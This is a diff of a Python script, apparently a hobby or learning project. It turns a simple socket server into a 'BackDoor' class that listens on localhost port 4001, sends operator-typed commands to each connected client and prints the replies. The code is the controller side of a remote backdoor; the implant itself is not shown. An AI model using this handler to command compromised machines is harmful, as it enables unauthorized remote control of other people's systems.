@@ -1,56 +1,59 @@
 #!/usr/bin/python3
+
 import socket
 import threading
+import sys
 
-# [TO DO] IMPLEMENTAR EM CLASSES PARA TER ACESSO A VARIAVEIS GLOBAIS
-# [TO DO] IMPLEMENTAR USE CASE EM COMMAND: q
-# [TO DO] É NECESSARIO UTILIZAR 2 THREADS?
-# [TO DO] CHAMAR METODO RECEIVE APOS UTILIZAR METODO SEND?(COM 1 THREAD)
-# [TO DO] CASO TORNE O ARQUIVO .py EXECUTAVEL, CONSEGUE RODAR COM ./file.py
+class BackDoor():
+    def __init__(self):
+        self.HOST = '127.0.0.1'
+        self.PORT = 4001
+        self.KEEP_GOING = True
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.bind((self.HOST, self.PORT))
+        self.s.listen()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def main(self):
+        self.print_msg('Server started')
 
-HOST = '127.0.0.1'
-PORT = 4001
+        while self.KEEP_GOING:
+            client, address = self.s.accept()
 
-s.bind((HOST, PORT))
+            self.print_msg(f'New connection: {str(address)}')
 
-s.listen()
+            send_thread = threading.Thread(group=None, target=self.send, args=(client, address), daemon=True)
+            send_thread.start()
 
-def receive(client, address):
-    while True:
-        try:
-            data = client.recv(1024).decode('utf-8')
+            receive_thread = threading.Thread(group=None, target=self.receive, args=(client, address), daemon=True)
+            receive_thread.start()
 
-            if not data or 'closed' in data:
-                print(f'Connection with host: {address} closed')
+    def send(self, client, address):
+        while self.KEEP_GOING:
+            try:
+                cmd = input(f'{address}>>>: ')
+                client.send(cmd.encode('utf-8'))
+            except:
+                self.print_msg('Failed to send command to client')
+                self.KEEP_GOING = False
 
-            print(f'{address}>>>: {data}')
-            print(f'{address}>>>: Enter a new command')
-        except:
-            print(f'Failed to receive data from host: {address}')
+    def receive(self, client, address):
+        while self.KEEP_GOING:
+            try:
+                data = client.recv(1024).decode('utf-8')
 
-def send(client, address):
-    while True:
-        try:
-            cmd = input(f"{address}>>>: ")
+                if not data or 'closed' in data:
+                    self.print_msg(f'Connection with host: {address} closed')
+                    self.KEEP_GOING = False
 
-            client.send(cmd.encode('utf-8'))
-        except:
-            print(f'Failed to send command to client')
+                print(f'{address}>>>: {data}')
+                self.print_msg(f'{address}>>>: Enter a new command')
+            except:
+                self.print_msg(f'Failed to receive data from host: {address}')
+                self.KEEP_GOING = False
 
-def main():
-    print('Server started')
-
-    while True:
-        client, address = s.accept()
-        print(f'New connection: {str(address)}')
-
-        send_thread = threading.Thread(group=None, target=send, args=(client, address), daemon=True)
-        send_thread.start()
-
-        receive_thread = threading.Thread(group=None, target=receive, args=(client, address), daemon=True)
-        receive_thread.start()
+    def print_msg(self, msg):
+        print(f'[*] {msg} [*]')
 
 if __name__ == '__main__':
-    main()
+    bd = BackDoor()
+    bd.main()
